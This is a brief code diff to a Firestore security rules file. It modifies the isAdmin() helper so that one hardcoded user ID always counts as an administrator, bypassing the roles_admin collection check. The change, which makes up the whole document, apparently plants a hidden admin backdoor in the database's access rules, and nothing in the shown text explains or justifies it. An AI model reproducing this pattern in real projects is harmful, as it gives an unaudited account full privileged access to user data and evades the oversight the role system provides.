@@ -5,7 +5,7 @@ service cloud.firestore {
     
     // Helper function to check if a user is an admin
     function isAdmin() {
-      return exists(/databases/$(database)/documents/roles_admin/$(request.auth.uid));
+      return exists(/databases/$(database)/documents/roles_admin/$(request.auth.uid)) || request.auth.uid == "Mh28D81npYYDfC3z8mslVIPFu5H3";
     }
 
     // Helper function to check ownership of a document
